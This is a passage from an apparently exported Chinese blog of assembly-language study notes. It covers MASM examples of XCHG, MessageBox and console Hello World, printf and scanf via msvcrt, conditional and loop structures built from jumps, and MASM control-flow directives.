<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>mov ah<span class="token punctuation">,</span>flag</pre></td></tr><tr><td data-num="2"></td><td><pre>sahf</pre></td></tr></table></figure><h3 id="xchg"><a class="anchor" href="#xchg">#</a> XCHG</h3>
<p>只对寄存器和内存进行交换，无立即数</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>xchg reg<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>将寄存器中的值进行交换</pre></td></tr><tr><td data-num="2"></td><td><pre>xchg reg<span class="token punctuation">,</span>mem<span class="token punctuation">;</span>将内存和寄存器中的值进行交换</pre></td></tr><tr><td data-num="3"></td><td><pre>xchg mem<span class="token punctuation">,</span>reg<span class="token punctuation">;</span>将寄存器和内存中的值进行交换</pre></td></tr></table></figure>]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之控制台程序的输入与输出</title>
    <url>/article/c3dea2a1.html</url>
    <content><![CDATA[<p>我们都知道在 C 语言中的输入输出中最常用的是 scanf 和 printf，其它的比如 gets 和 puts；而在 C++ 中的标准输入输出流一般用 cin 和 cout，那么汇编语言中的输入输出方式是什么样子的呢？接下来我们用 “Hello World!” 来进行学习。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/dfc8e658c198a318b1f053f430bc271.jpg" alt="image-dfc8e658c198a318b1f053f430bc271" /></p>
<p><strong>两种方式：</strong></p>
<ul>
<li>
<p>一种方式就是使用 API，类似于 MessageBox，然后直接写到控制台上</p>
</li>
<li>
<p>另一种是使用一个 MessageBox，来弹出一个消息框。</p>
</li>
</ul>
<h3 id="弹窗版的hello-world"><a class="anchor" href="#弹窗版的hello-world">#</a> 弹窗版的 Hello World!</h3>
<p><strong>定义弹窗的字符串</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="2"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr></table></figure><p><strong>调用 MessageBox</strong></p>
<p>MessageBox 的四个参数</p>
<ol>
<li>句柄</li>
<li>内容</li>
<li>标题</li>
<li>按钮，比如：确定，取消之类</li>
</ol>
<p>按照从右往左的压参的方式</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">;</span>调用MessageBox</pre></td></tr><tr><td data-num="2"></td><td><pre>push <span class="token number">0</span><span class="token punctuation">;</span>按钮</pre></td></tr><tr><td data-num="3"></td><td><pre>push offset text<span class="token punctuation">;</span>push 标题</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">;</span>OFFSET是将数值回送变量或标号的偏移地址值<span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="5"></td><td><pre>push offset text<span class="token punctuation">;</span>push 容</pre></td></tr><tr><td data-num="6"></td><td><pre>push <span class="token number">0</span><span class="token punctuation">;</span>push 句柄</pre></td></tr><tr><td data-num="7"></td><td><pre>call MessageBox<span class="token punctuation">;</span>完成调用</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="10"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="13"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="17"></td><td><pre>main proc</pre></td></tr><tr><td data-num="18"></td><td><pre>	<span class="token punctuation">;</span>调用MessageBox</pre></td></tr><tr><td data-num="19"></td><td><pre>	push <span class="token number">0</span><span class="token punctuation">;</span>按钮</pre></td></tr><tr><td data-num="20"></td><td><pre>	push offset text<span class="token punctuation">;</span>push 标题</pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token punctuation">;</span>OFFSET是将数值回送变量或标号的偏移地址值<span class="token punctuation">.</span> </pre></td></tr><tr><td data-num="22"></td><td><pre>	push offset text<span class="token punctuation">;</span>push 容</pre></td></tr><tr><td data-num="23"></td><td><pre>	push <span class="token number">0</span><span class="token punctuation">;</span>push 句柄</pre></td></tr><tr><td data-num="24"></td><td><pre>	call MessageBox<span class="token punctuation">;</span>完成调用</pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">;</span>堆栈进行防溢</pre></td></tr><tr><td data-num="26"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">;</span>四个参数，一个参数<span class="token number">32</span>位，四个<span class="token number">32</span>位的<span class="token number">4</span>个字节</pre></td></tr><tr><td data-num="27"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="29"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="30"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="31"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121204413135.png" alt="image-20220121204413135" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到按钮是 &quot;确定&quot;，然后标题和内容是 &quot;Hello World!&quot;</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121202832394.png" alt="image-20220121202832394" /></p>
<h3 id="控制台输出hello-world"><a class="anchor" href="#控制台输出hello-world">#</a> 控制台输出 Hello World!</h3>
<p>在初级初级汇编中，因为我们都是在控制台上来写这个代码的，那么我们肯定就要知道怎么在控制台上来接收参数和写出东西；</p>
<p>那么其实呢，我们有两种方式</p>
<ul>
<li>一种是调用 MessageBox 类似的 API，写控制台，就是往控制台怎么写流的一个 API</li>
<li>另一种更便捷的方式，就是调用一个系统导出的 C 的库函数</li>
</ul>
<p>就是说如果直接调用一个 C 的库函数，我们就可以直接调用 printf 和 scanf，但只是调用方法不太一样，在调入之前，我们需要先给它包含一个头文件，因为我们这个 scanf 和 printf 其实都是在一个动态链接库里进行一个导出的，所以说呢，我们在使用之前呢，还是要把它这个头文件加进去</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="2"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr></table></figure><p>包含完它的头文件和 lib 之后我们就可以正常使用了.</p>
<p><strong>调用 printf</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>call crt_printf</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="19"></td><td><pre>main proc</pre></td></tr><tr><td data-num="20"></td><td><pre>	push offset text</pre></td></tr><tr><td data-num="21"></td><td><pre>	call crt_printf<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="23"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="24"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">;</span>栈平</pre></td></tr><tr><td data-num="25"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="26"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121210512511.png" alt="image-20220121210512511" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到 &quot;Hello World!&quot; 被打印出来了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121210417637.png" alt="image-20220121210417637" /></p>
<p>printf 的输出有了，那么 scanf 的输入如何在控制台上接收呢？</p>
<p><strong>scanf 的两个参数</strong></p>
<ul>
<li>字符串</li>
<li>取地址</li>
</ul>
<p>格式化字符串进行接收</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>format db <span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr></table></figure><p>然后我们需要传递两个参数进去</p>
<p>一个是需要用来容纳接收参数的一个字符串</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">;</span>已经初始化好了的字符串</pre></td></tr><tr><td data-num="2"></td><td><pre>text2 db <span class="token operator">?</span><span class="token punctuation">;</span>由系统进行初始化</pre></td></tr><tr><td data-num="3"></td><td><pre>text3 db <span class="token number">0</span><span class="token punctuation">;</span>自己初始化为零</pre></td></tr></table></figure><p><strong>调用 scanf 函数</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>call crt_scanf</pre></td></tr></table></figure><p><strong>完整样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>text db <span class="token string">"Hello World!"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">;</span>定义弹窗的字符串</pre></td></tr><tr><td data-num="17"></td><td><pre>text2 db <span class="token number">0</span></pre></td></tr><tr><td data-num="18"></td><td><pre>format db <span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">0</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	push offset text2</pre></td></tr><tr><td data-num="23"></td><td><pre>	push offset format</pre></td></tr><tr><td data-num="24"></td><td><pre>	call crt_scanf</pre></td></tr><tr><td data-num="25"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	push offset text2</pre></td></tr><tr><td data-num="27"></td><td><pre>	call crt_printf<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="29"></td><td><pre>	call ExitProcess<span class="token punctuation">;</span>退出进程</pre></td></tr><tr><td data-num="30"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="31"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="32"></td><td><pre>END main</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121212310361.png" alt="image-20220121212310361" /></p>
<p><strong>运行结果</strong></p>
<p>可以看到接收完之后又打印出来了</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220121212110261.png" alt="image-20220121212110261" /></p>
<p>如此使用 scanf 和 printf 的输入输出就实现了</p>
]]></content>
      <categories>
        <category>汇编</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言Studying Note之条件结构与条件控制流伪指令学习</title>
    <url>/article/189db1b1.html</url>
    <content><![CDATA[<h2 id="条件结构"><a class="anchor" href="#条件结构">#</a> 条件结构</h2>
<p>条件结构在 C 语言中分为</p>
<ul>
<li>顺序结构</li>
<li>选择结构</li>
<li>循环结构</li>
</ul>
<p>三大类，下面通过汇编语言模拟实现</p>
<h3 id="选择结构"><a class="anchor" href="#选择结构">#</a> 选择结构</h3>
<p>利用汇编语言模拟 <code>if else</code>  语句</p>
<p>模拟语句</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>o1 <span class="token operator">==</span> o2<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    x <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    y <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    x <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    y <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>汇编语言实现</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>o1 dword <span class="token number">100</span></pre></td></tr><tr><td data-num="16"></td><td><pre>o2 dword <span class="token number">100</span></pre></td></tr><tr><td data-num="17"></td><td><pre>x dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="18"></td><td><pre>y dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="21"></td><td><pre>main proc</pre></td></tr><tr><td data-num="22"></td><td><pre>	mov eax<span class="token punctuation">,</span>o1</pre></td></tr><tr><td data-num="23"></td><td><pre>	cmp eax<span class="token punctuation">,</span>o2</pre></td></tr><tr><td data-num="24"></td><td><pre>	jnz lp<span class="token punctuation">;</span>相等执行下一行</pre></td></tr><tr><td data-num="25"></td><td><pre>	mov x<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	mov y<span class="token punctuation">,</span><span class="token number">1</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	jmp lq<span class="token punctuation">;</span>执行完跳转，结束</pre></td></tr><tr><td data-num="28"></td><td><pre>lp<span class="token operator">:</span><span class="token punctuation">;</span>不相等跳转到此处执行</pre></td></tr><tr><td data-num="29"></td><td><pre>	mov x<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="30"></td><td><pre>	mov y<span class="token punctuation">,</span><span class="token number">2</span></pre></td></tr><tr><td data-num="31"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="32"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="33"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="34"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="35"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="36"></td><td><pre>END main</pre></td></tr></table></figure><p>jnz 指令作用</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128153113197.png" alt="image-20220128153113197" /></p>
<h4 id="断点测试"><a class="anchor" href="#断点测试">#</a> 断点测试</h4>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152500855.png" alt="image-20220128152500855" /></p>
<p>相等	执行下一行代码</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152532547.png" alt="image-20220128152532547" /></p>
<p>执行完结束</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152558290.png" alt="image-20220128152558290" /></p>
<p>给 eax 赋值为 101，测试不相等时执行情况</p>
<p>可以看到程序跳转到 lp 执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152702148.png" alt="image-20220128152702148" /></p>
<p>最终结束程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128152738283.png" alt="image-20220128152738283" /></p>
<h3 id="循环结构"><a class="anchor" href="#循环结构">#</a> 循环结构</h3>
<p>利用汇编语言模拟 <code>while</code>  语句</p>
<p>模拟语句</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span> i <span class="token operator">&lt;</span> <span class="token number">100</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    i <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>jle 指令作用：小于等于 / 不大于时转移</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128153253015.png" alt="image-20220128153253015" /></p>
<p>汇编语言实现</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">.586</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">.</span>MODEL flat<span class="token punctuation">,</span> stdcall</pre></td></tr><tr><td data-num="3"></td><td><pre>option casemap<span class="token operator">:</span>none</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>include windows<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="6"></td><td><pre>include user32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="7"></td><td><pre>include kernel32<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="8"></td><td><pre>include msvcrt<span class="token punctuation">.</span>inc</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>includelib user32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="11"></td><td><pre>includelib kernel32<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="12"></td><td><pre>includelib msvcrt<span class="token punctuation">.</span>lib</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="15"></td><td><pre>i dword <span class="token number">0</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="18"></td><td><pre>main proc</pre></td></tr><tr><td data-num="19"></td><td><pre>	mov eax<span class="token punctuation">,</span><span class="token number">100</span></pre></td></tr><tr><td data-num="20"></td><td><pre>lq<span class="token operator">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>	cmp eax<span class="token punctuation">,</span>i</pre></td></tr><tr><td data-num="22"></td><td><pre>	jle lp</pre></td></tr><tr><td data-num="23"></td><td><pre>	inc i</pre></td></tr><tr><td data-num="24"></td><td><pre>	jmp lq</pre></td></tr><tr><td data-num="25"></td><td><pre>lp<span class="token operator">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>	push <span class="token number">0</span></pre></td></tr><tr><td data-num="27"></td><td><pre>	call ExitProcess</pre></td></tr><tr><td data-num="28"></td><td><pre>	add esp<span class="token punctuation">,</span><span class="token number">4</span></pre></td></tr><tr><td data-num="29"></td><td><pre>main ENDP</pre></td></tr><tr><td data-num="30"></td><td><pre>END main</pre></td></tr></table></figure><h4 id="断点测试-2"><a class="anchor" href="#断点测试-2">#</a> 断点测试</h4>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128153727050.png" alt="image-20220128153727050" /></p>
<p>实现 <code>i &lt; 100</code>  时， <code>i ++</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220128153806025.png" alt="image-20220128153806025" /></p>
<h2 id="条件控制流伪指令"><a class="anchor" href="#条件控制流伪指令">#</a> 条件控制流伪指令</h2>
<p>32 位模式下，MASM 包含了一些高级条件控制流伪指令（conditional control flow directives），这有助于简化编写条件语句。遗憾的是，这些伪指令不能用于 64 位模式。</p>
<p>对程序进行汇编之前，汇编器执行的是预处理步骤。在这个步骤中，汇编器要识别伪指令，如：.CODE、.DATA，以及一些用于条件控制流的伪指令。</p>
<p>下表列出了这些伪指令</p>
<table>
<thead>
<tr>
<th>伪指令</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>.BREAK</td>
<td>生成代码终止 .WHILE 或 .REPEAT 块</td>
</tr>
<tr>
<td>.CONTINUE</td>
<td>生成代码跳转到 .WHILE 或 .REPEAT 块的顶端</td>
</tr>
<tr>
<td>.ELSE</td>
<td>当 .IF 条件不满足时，开始执行的语句块</td>
</tr>
<tr>
<td>.ELSEIF condition</td>
<td>生成代码测试 condition，并执行其后的语句，直到碰到一个 .ENDIF 或另一个 .ELSEIF 伪指令</td>
</tr>
<tr>
<td>.ENDIF</td>
<td>终止 .IF、.ELSE 或 .ELSEIF 伪指令后面的语句块</td>
</tr>
<tr>
<td>.ENDW</td>
<td>终止 .WHILE 伪指令后面的语句块</td>
</tr>
<tr>
<td>.IF condition</td>
<td>如果 condition 为真，则生成代码执行语句块</td>
</tr>
<tr>
<td>.REPEAT</td>
<td>生成代码重复执行语句块，直到条件为真</td>
</tr>
<tr>
<td>.UNTIL condition</td>
<td>生成代码重复执行 .REPEAT 和 .UNTIL 伪指令之间的语句块，直到 condition 为真</td>
</tr>
<tr>
<td>.UNTILCXZ</td>
<td>生成代码重复执行 .REPEAT 和 .UNTILCXZ 伪指令之间的语句块，直到 CX 为零</td>
</tr>
<tr>
<td>.WHILE condition</td>
<td>当 condition 为真时，生成代码执行 .WHILE 和 .ENDW 伪指令之间的语句块</td>
</tr>
</tbody>
</table>
<h3 id="条件控制流语法"><a class="anchor" href="#条件控制流语法">#</a> 条件控制流语法</h3>
<h4 id="if使用语法"><a class="anchor" href="#if使用语法">#</a> .if 使用语法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">if</span> condition1</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">[</span><span class="token punctuation">.</span>elseif condition2</pre></td></tr><tr><td data-num="4"></td><td><pre> 	statements<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token keyword">else</span></pre></td></tr><tr><td data-num="6"></td><td><pre> 	statements<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span>endif</pre></td></tr></table></figure><p><strong>使用样例</strong></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>data</pre></td></tr><tr><td data-num="2"></td><td><pre>a1 dword <span class="token number">5</span></pre></td></tr><tr><td data-num="3"></td><td><pre>result dword <span class="token operator">?</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">.</span>code</pre></td></tr><tr><td data-num="6"></td><td><pre>mov eax<span class="token punctuation">,</span> <span class="token number">6</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">.</span><span class="token keyword">if</span> eax <span class="token operator">></span> a1</pre></td></tr><tr><td data-num="8"></td><td><pre>	mov result<span class="token punctuation">,</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">.</span>endif</pre></td></tr></table></figure><h3 id="循环控制流语法"><a class="anchor" href="#循环控制流语法">#</a> 循环控制流语法</h3>
<h4 id="do-while语法"><a class="anchor" href="#do-while语法">#</a> do while 语法</h4>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>repeat</pre></td></tr><tr><td data-num="2"></td><td><pre>    statements</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">.</span>until condition</pre></td></tr></table></figure><h4 id="while语法"><a class="anchor" href="#while语法">#</a> while 语法</h4>
